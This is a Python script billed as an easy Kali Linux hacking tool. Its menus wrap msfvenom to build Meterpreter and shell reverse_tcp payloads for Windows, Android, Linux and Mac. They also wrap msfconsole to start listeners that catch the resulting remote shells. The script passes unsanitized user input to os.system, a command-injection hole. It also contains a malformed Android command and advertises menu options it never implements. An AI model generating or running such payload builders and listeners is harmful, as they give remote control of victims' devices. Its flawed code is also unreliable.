import os
import sys
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

print(" _____\n| ____|____________\n|  _| |_  /_  /_  /\n| |___ / / / / / /_____ \n|_____/___/___/________>")
#Easy to use Kali Linux Hacking Tool!
print(color.YELLOW + color.BOLD + "\n---------------------- Welcome to Ezzz ----------------------\n")
print(color.GREEN + "1) Create Payload")
print("2) Start Listener")
print("3) Other Useful Tools")
print("4) Tools For Fun!\n")
print("99) Quit\n"+color.END)

val = int(input(color.BOLD+"Select Your Option To Begin Your Journey : "))
for x in range(44):
	sys.stdout.write("-")

if val == 1:
	print(color.YELLOW+color.BOLD+"\nLet's craft some payloads!\nObviously, for that you need to select something..."+color.END)
	print(color.GREEN + color.BOLD + "\n1) Windows")
	print("2) Android")
	print("3) Linux")
	print("4) Mac" + color.END)
	payload = int(input("Select Option : "))
	if payload == 1:
		ip = input(color.RED +"Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		pname = input("Enter Payload Name : ")
		cmnd = "msfvenom -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+portno+" -f exe -o ~/Desktop/"+pname+".exe"
		os.system(cmnd)
	if payload == 2:
		ip = input("Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		pname = input("Enter Payload Name : ")
		cmnd = "msfvenom -p android/meterpreter/reverse_tcp lhost="+ip+" lport="+portno+" R exe -o ~/Desktop/"+pname+".apk"
		os.system(cmnd)
	if payload == 3:
		ip = input("Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		pname = input("Enter Payload Name : ")
		cmnd = "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+portno+" -f elf -o ~/Desktop/"+pname+".elf"
		os.system(cmnd)
	if payload == 4:
		ip = input("Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		pname = input("Enter Payload Name : ")
		cmnd = "msfvenom -p osx/x86/shell_reverse_tcp lhost="+ip+" lport="+portno+" -f macho -o ~/Desktop/"+pname+".macho"
		os.system(cmnd)

if val == 2:
	print(color.YELLOW+color.BOLD+"\nSelect Listener For Your Payload Accordingly\n"+color.END)
	print(color.GREEN + color.BOLD + "\n1) Windows")
	print("2) Android")
	print("3) Linux")
	print("4) Mac" + color.END)
	listener = int(input("Select Option : "))
	if listener == 1:
		ip = input("Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		print(color.YELLOW + "Just a second..." + color.END)
		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
		os.system(cmnd)
	if listener == 2:
		ip = input("Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		print(color.YELLOW + "Just a second..." + color.END)
		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
		os.system(cmnd)
	if listener == 3:
		ip = input("Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		print(color.YELLOW + "Just a second..." + color.END)
		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'"
		os.system(cmnd)
	if listener == 4:
		ip = input("Enter IP Address : ")
		portno = input("Enter Unique Port No : ")
		print(color.YELLOW + "Just a second..." + color.END)
		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD osx/x86/shell_reverse_tcp; exploit'"
		os.system(cmnd)

if val == 99:
	exit
